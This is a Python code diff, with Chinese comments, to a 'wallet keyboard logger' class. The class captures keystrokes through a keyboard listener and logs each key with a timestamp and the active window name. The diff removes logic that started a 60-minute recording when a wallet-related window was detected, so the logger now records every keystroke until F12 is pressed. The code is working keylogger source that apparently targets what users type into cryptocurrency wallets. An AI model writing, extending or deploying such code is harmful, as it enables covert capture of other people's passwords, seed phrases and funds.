@@ -11,36 +11,19 @@ from pathlib import Path
 
 from .detectors import get_active_window_name, should_trigger_recording, CHECK_INTERVAL
 
-# 记录时长（秒）
-RECORDING_DURATION = 60 * 60  # 60分钟
-
 
 class KeyLogger:
     """钱包键盘记录器"""
 
     _KEY_NAMES = None
 
-    def __init__(
-        self,
-        log_file: Path = None,
-        duration: int = RECORDING_DURATION,
-        debug_mode: bool = False,
-        dry_run: bool = False,
-    ):
+    def __init__(self, log_file: Path = None, dry_run: bool = False):
         self.log_file = log_file
-        self.duration = duration
-        self.debug_mode = debug_mode
         self.dry_run = dry_run
         self.keyboard_listener = None
         self._log_handle = None
-
-        # 记录状态
-        self.is_recording = False
-        self.recording_start_time = 0
-        self.recording_timer = None
         self._lock = threading.Lock()
 
-        # 窗口检测线程
         self._monitor_thread = None
         self._stop_monitor = threading.Event()
 
@@ -122,11 +105,6 @@ class KeyLogger:
 
     def on_press(self, key):
         """键盘按下事件"""
-        if not self.debug_mode:
-            with self._lock:
-                if not self.is_recording:
-                    return
-
         window_name = get_active_window_name() or "Unknown"
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         key_str = self.format_key(key)
@@ -136,112 +114,35 @@ class KeyLogger:
 
         self._write_log(f"[{timestamp}] {status} [{window_name}] {key_str}\n")
 
-        if self.debug_mode:
-            print(f"\r{status} [{window_name}] {key_str}", end="", flush=True)
-
     def on_release(self, key):
         """键盘释放事件（用于退出）"""
         Key, _, _ = self._load_keyboard_backend()
-        # F12 退出
         if key == Key.f12:
             print("\n检测到 F12，停止程序...")
             self._stop_monitor.set()
-            self.stop_recording()
             return False
 
     def _monitor_windows(self):
         """后台线程：持续检测窗口变化"""
-        last_window = None
-
         while not self._stop_monitor.is_set():
             try:
-                window_name = get_active_window_name() or "Unknown"
-                is_match = should_trigger_recording(window_name)
-
-                if self.debug_mode and window_name != last_window:
-                    last_window = window_name
-                    status = ">>>" if is_match else "   "
-                    print(f"\n{status} 窗口变化: [{window_name}]")
-
-                if not self.debug_mode and not self.dry_run and is_match:
-                    self.start_recording()
+                get_active_window_name()
             except Exception:
                 pass
-
             self._stop_monitor.wait(CHECK_INTERVAL)
-
-    def start_recording(self):
-        """开始记录"""
-        with self._lock:
-            if self.is_recording:
-                return
-            self.is_recording = True
-            self.recording_start_time = time.time()
-
-        window_name = get_active_window_name() or "Unknown"
-        print(f"\n>>> 检测到钱包窗口: [{window_name}]")
-        print(f">>> 开始记录，将持续 {self.duration // 60} 分钟")
-        print(f">>> 日志将写入: {self.log_file}")
-
-        timer = threading.Timer(self.duration, self.stop_recording)
-        with self._lock:
-            self.recording_timer = timer
-        timer.start()
-
-        self._write_log(f"\n# --- 记录开始: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
-        self._write_log(f"# 触发窗口: [{window_name}]\n")
-
-    def stop_recording(self):
-        """停止记录"""
-        with self._lock:
-            if not self.is_recording:
-                return
-            self.is_recording = False
-            timer = self.recording_timer
-            self.recording_timer = None
-
-        if timer:
-            timer.cancel()
-
-        self._write_log(f"# --- 记录结束: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n\n")
-        print(f"\n>>> 记录已停止 ({datetime.now().strftime('%H:%M:%S')})")
-        print(">>> 继续监听...\n")
 
     def start(self):
         """启动监听"""
-        print(f"钱包键盘记录器已启动")
+        print("钱包键盘记录器已启动")
         if self.dry_run:
             print("日志文件: dry-run 模式不创建日志")
         else:
             print(f"日志文件: {self.log_file}")
-        print(f"平台: {self.platform_info()}")
-        print(f"记录时长: {self.duration // 60} 分钟")
-        if self.dry_run:
-            mode = "dry-run (仅检测窗口，不记录按键)"
-        elif self.debug_mode:
-            mode = "调试 (记录所有按键)"
-        else:
-            mode = "正常 (自动触发)"
-        print(f"模式: {mode}\n")
+        print(f"按 F12 或 Ctrl+C 停止程序\n")
 
-        from .detectors import EXTENSION_PATTERNS
-        print(f"监控关键词: {', '.join(EXTENSION_PATTERNS[:5])}...")
-        print("工作原理: 持续检测活动窗口，匹配时自动记录\n")
-
-        if self.debug_mode or self.dry_run:
-            print("调试模式已启用 - 实时显示窗口信息")
-            print(f"当前窗口: [{get_active_window_name() or 'Unknown'}]")
-            print(f"是否匹配: {should_trigger_recording()}\n")
-
-        if self.dry_run:
-            print("dry-run 模式仅检测窗口变化，不启动键盘监听")
-            print("按 Ctrl+C 停止程序\n")
-        else:
-            print("等待检测到钱包窗口...")
-            print("按 F12 停止程序\n")
-
-        # 启动窗口检测线程
-        self._monitor_thread = threading.Thread(target=self._monitor_windows, daemon=True)
+        self._monitor_thread = threading.Thread(
+            target=self._monitor_windows, daemon=True
+        )
         self._monitor_thread.start()
 
         if self.dry_run:
@@ -249,27 +150,24 @@ class KeyLogger:
                 while not self._stop_monitor.is_set():
                     time.sleep(0.2)
             except KeyboardInterrupt:
-                print("\n\n已停止")
+                print("\n已停止")
             finally:
                 self._stop_monitor.set()
             return
 
-        # 启动键盘监听
         _, _, keyboard = self._load_keyboard_backend()
         self.keyboard_listener = keyboard.Listener(
             on_press=self.on_press,
-            on_release=self.on_release
+            on_release=self.on_release,
         )
-
         self.keyboard_listener.start()
 
         try:
             self.keyboard_listener.join()
         except KeyboardInterrupt:
-            print("\n\n已停止")
+            print("\n已停止")
         finally:
             self._stop_monitor.set()
-            self.stop_recording()
             self._close_log()
 
     @staticmethod
@@ -294,11 +192,9 @@ def create_log_file(log_dir: Path = None) -> Path:
 
     log_dir.mkdir(parents=True, exist_ok=True)
 
-    # 生成日志文件名（带日期）
     date_str = datetime.now().strftime("%Y%m%d")
     log_file = log_dir / f"recording_{date_str}.log"
 
-    # 写入日志头部
     import platform
     try:
         if not log_file.exists():
